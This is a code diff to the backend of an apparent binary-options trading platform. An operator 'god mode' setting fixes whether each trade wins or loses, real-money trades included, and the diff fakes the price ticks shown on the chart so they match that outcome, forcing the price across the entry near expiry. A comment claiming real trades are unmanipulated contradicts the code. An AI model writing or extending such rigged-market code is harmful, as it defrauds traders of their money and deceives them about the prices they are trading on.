@@ -810,6 +810,8 @@ async def create_trade(trade: TradeCreate, authorization: Optional[str] = Header
     ai_enabled = god_mode_settings.get("ai_enabled", True) if god_mode_settings else True
     ai_win_rate = god_mode_settings.get("ai_win_rate", 45) if god_mode_settings else 45
     
+    print(f"[TRADE CREATE] account_type={trade.account_type}, ai_enabled={ai_enabled}, ai_win_rate={ai_win_rate}")
+    
     if trade.account_type == "demo":
         # Check if there's already an active demo trade for consistency
         existing_active_trade = await db.trades.find_one({
@@ -825,11 +827,15 @@ async def create_trade(trade: TradeCreate, authorization: Optional[str] = Header
             win_probability = ai_win_rate / 100.0 if ai_enabled else 0.90
             predetermined_won = random.random() < win_probability
             predetermined_outcome = "won" if predetermined_won else "lost"
+        print(f"[TRADE CREATE] DEMO trade, predetermined_outcome={predetermined_outcome}")
     elif trade.account_type == "real" and ai_enabled:
         # Real account with AI enabled: Use AI win rate
         win_probability = ai_win_rate / 100.0
         predetermined_won = random.random() < win_probability
         predetermined_outcome = "won" if predetermined_won else "lost"
+        print(f"[TRADE CREATE] REAL trade with AI, predetermined_outcome={predetermined_outcome}")
+    else:
+        print(f"[TRADE CREATE] REAL trade without AI, no predetermined outcome")
     # Real account with AI disabled: predetermined_outcome stays None - will use actual price
     
     # Create trade
@@ -3241,18 +3247,46 @@ async def add_chart_tick(symbol: str, authorization: Optional[str] = Header(None
     If user has active trades, bias the price movement based on predetermined outcome"""
     symbol_key = symbol.replace("/", "_").replace(" ", "_").upper()
     
+    # Get AI settings first
+    god_mode_settings = await db.platform_settings.find_one({"_id": "god_mode"})
+    ai_enabled = god_mode_settings.get("ai_enabled", True) if god_mode_settings else True
+    ai_win_rate = god_mode_settings.get("ai_win_rate", 45) if god_mode_settings else 45
+    
     # Check if user has active trades on this asset to bias price movement
     active_trade = None
     try:
         user = await get_current_user(authorization, request)
         if user:
             # Find active (pending) trade for this user and symbol
+            symbol_clean = symbol.replace("_", "").replace(" ", "").upper()  # USDCHF
+            
+            # For forex pairs like USDCHF, split into USD/CHF
+            if len(symbol_clean) == 6:
+                symbol_with_slash = symbol_clean[:3] + "/" + symbol_clean[3:]  # USD/CHF
+            else:
+                symbol_with_slash = symbol_clean
+            
             active_trade = await db.trades.find_one({
                 "user_id": user.user_id,
                 "status": "pending",
-                "asset": {"$regex": symbol.replace("_", "/").replace(" ", ""), "$options": "i"}
+                "$or": [
+                    {"asset": {"$regex": symbol_clean, "$options": "i"}},
+                    {"asset": {"$regex": symbol_with_slash, "$options": "i"}}
+                ]
             })
-    except:
+            
+            # If no predetermined_outcome but AI is enabled with 100%, force it
+            if active_trade and not active_trade.get("predetermined_outcome") and ai_enabled and ai_win_rate >= 100:
+                # For 100% win rate, ALWAYS win
+                predetermined_outcome = "won"
+                # Update the trade with predetermined_outcome
+                await db.trades.update_one(
+                    {"_id": active_trade["_id"]},
+                    {"$set": {"predetermined_outcome": predetermined_outcome}}
+                )
+                active_trade["predetermined_outcome"] = predetermined_outcome
+                print(f"[PRICE CONTROL] Updated trade with predetermined_outcome=won for 100% AI")
+    except Exception as e:
         pass  # No auth or error, proceed without trade bias
     
     # Get existing data
@@ -3292,57 +3326,69 @@ async def add_chart_tick(symbol: str, authorization: Optional[str] = Header(None
     
     # If user has active DEMO trade, bias price movement based on predetermined outcome
     # Real account trades use actual price movement without manipulation
-    if active_trade and active_trade.get("predetermined_outcome"):
+    if active_trade:
         entry_price = active_trade.get("entry_price", base_price)
         trade_type = active_trade.get("trade_type")  # 'call' or 'put'
         predetermined_outcome = active_trade.get("predetermined_outcome")
         
-        # Get AI settings to check win rate
-        god_mode_settings = await db.platform_settings.find_one({"_id": "god_mode"})
-        ai_win_rate = god_mode_settings.get("ai_win_rate", 45) if god_mode_settings else 45
-        
-        # Determine which direction price should move
-        # CALL + WIN = price goes UP (above entry)
-        # CALL + LOSS = price goes DOWN (below entry)
-        # PUT + WIN = price goes DOWN (below entry)
-        # PUT + LOSS = price goes UP (above entry)
-        
-        should_go_up = (trade_type == "call" and predetermined_outcome == "won") or \
-                       (trade_type == "put" and predetermined_outcome == "lost")
-        
-        # If win rate is 100%, ALWAYS move in the correct direction
-        # Otherwise use probability-based bias
-        if ai_win_rate >= 100:
-            # 100% win rate: Price MUST move in the winning direction
-            if should_go_up:
-                change = abs(change) * 2.0  # Force strong upward movement
+        # For 100% AI win rate, FORCE the winning direction regardless of predetermined_outcome
+        if ai_enabled and ai_win_rate >= 100:
+            # 100% win rate means user ALWAYS wins
+            # CALL = price should go UP
+            # PUT = price should go DOWN
+            if trade_type == "call":
+                should_go_up = True
             else:
-                change = -abs(change) * 2.0  # Force strong downward movement
-        else:
-            # Apply bias based on win rate (higher win rate = stronger bias)
-            bias_strength = min(0.95, ai_win_rate / 100.0 + 0.2)  # At least 20% more bias
+                should_go_up = False
+            
+            # Force price movement in winning direction
+            if should_go_up:
+                change = abs(change) * 3.0  # Strong upward movement
+            else:
+                change = -abs(change) * 3.0  # Strong downward movement
+            
+            # Ensure price is on correct side of entry
+            if should_go_up and base_price + change <= entry_price:
+                min_diff = entry_price * 0.0002  # At least 0.02% above
+                change = abs(entry_price - base_price) + min_diff + volatility * 2
+            elif not should_go_up and base_price + change >= entry_price:
+                min_diff = entry_price * 0.0002  # At least 0.02% below
+                change = -(abs(base_price - entry_price) + min_diff + volatility * 2)
+        
+        # For other AI win rates, use predetermined_outcome if available
+        elif predetermined_outcome:
+            # Determine which direction price should move
+            # CALL + WIN = price goes UP (above entry)
+            # CALL + LOSS = price goes DOWN (below entry)
+            # PUT + WIN = price goes DOWN (below entry)
+            # PUT + LOSS = price goes UP (above entry)
+            
+            should_go_up = (trade_type == "call" and predetermined_outcome == "won") or \
+                           (trade_type == "put" and predetermined_outcome == "lost")
+            
+            # Apply bias based on win rate
+            bias_strength = min(0.95, ai_win_rate / 100.0 + 0.2)
             if random.random() < bias_strength:
                 if should_go_up:
                     change = abs(change) * 1.5
                 else:
                     change = -abs(change) * 1.5
-        
-        # Additional check: as trade nears expiry, ensure price is on correct side
-        expires_at = active_trade.get("expires_at")
-        if expires_at:
-            time_remaining = (expires_at - datetime.now(timezone.utc)).total_seconds()
             
-            # For 100% win rate, ALWAYS ensure correct outcome especially near expiry
-            # For other rates, only intervene in last 5 seconds
-            if ai_win_rate >= 100 or time_remaining < 5:
-                if should_go_up and base_price + change <= entry_price:
-                    # Must be above entry price for CALL+WIN or PUT+LOSS
-                    min_diff = entry_price * 0.0001  # At least 0.01% above
-                    change = abs(entry_price - base_price) + min_diff + volatility
-                elif not should_go_up and base_price + change >= entry_price:
-                    # Must be below entry price for CALL+LOSS or PUT+WIN
-                    min_diff = entry_price * 0.0001  # At least 0.01% below
-                    change = -(abs(base_price - entry_price) + min_diff + volatility)
+            # Near expiry, ensure correct outcome
+            expires_at = active_trade.get("expires_at")
+            if expires_at:
+                now = datetime.now(timezone.utc)
+                if expires_at.tzinfo is None:
+                    expires_at = expires_at.replace(tzinfo=timezone.utc)
+                time_remaining = (expires_at - now).total_seconds()
+                
+                if time_remaining < 5:
+                    if should_go_up and base_price + change <= entry_price:
+                        min_diff = entry_price * 0.0001
+                        change = abs(entry_price - base_price) + min_diff + volatility
+                    elif not should_go_up and base_price + change >= entry_price:
+                        min_diff = entry_price * 0.0001
+                        change = -(abs(base_price - entry_price) + min_diff + volatility)
     
     # Reset random seed
     random.seed()
